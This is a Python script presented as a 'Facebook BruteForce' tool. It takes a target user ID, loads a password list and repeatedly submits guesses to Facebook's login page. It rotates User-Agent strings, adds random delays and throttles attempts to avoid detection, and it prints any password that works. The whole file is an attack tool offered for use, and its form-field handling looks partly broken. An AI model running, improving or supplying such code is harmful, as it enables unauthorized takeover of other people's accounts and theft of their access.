import os
import random
import time
import requests
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n\t--------------------------------------')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}
MAX_ATTEMPTS_PER_HOUR = 5
ATTEMPT_COUNTER = 0

def create_form():
    session = requests.Session()
    data = session.get(POST_URL, headers=HEADERS)
    soup = BeautifulSoup(data.text, 'html.parser')
    form = {
        'lsd': soup.form.input['value'],
    }
    user_id = input('Enter User ID to target: ').strip()
    form['jazoest'] = f'{user_id}_'
    return form, session

def is_this_a_password(index, password, form, session):
    global ATTEMPT_COUNTER

    if ATTEMPT_COUNTER >= MAX_ATTEMPTS_PER_HOUR:
        print("Reached maximum attempts per hour. Waiting for an hour...")
        time.sleep(3600)
        ATTEMPT_COUNTER = 0

    # Add random delay between attempts
    time.sleep(random.uniform(1, 3))

    # Change User-Agent
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    try:
        form['pass'] = password
        r = session.post(POST_URL, data=form, headers=session.headers)
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        return False

    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        with open('temp', 'w') as f:
            f.write(str(r.content))
        print(f'\nPassword found is: {password}')
        return True
    return False

if __name__ == "__main__":
    print('\n---------- Welcome To Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print(f"Password file is not exist: {PASSWORD_FILE}")
        sys.exit(0)

    print(f"Password file selected: {PASSWORD_FILE}")
    form, session = create_form()

    with open(PASSWORD_FILE, 'r') as f:
        password_data = f.read().split("\n")

    # Add a list of User-Agents
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
        # ... add more User-Agents ...
    ]

    for index, password in enumerate(password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(f"Trying password [{index}]: {password}")
        if is_this_a_password(index, password, form, session):
            break
        ATTEMPT_COUNTER += 1
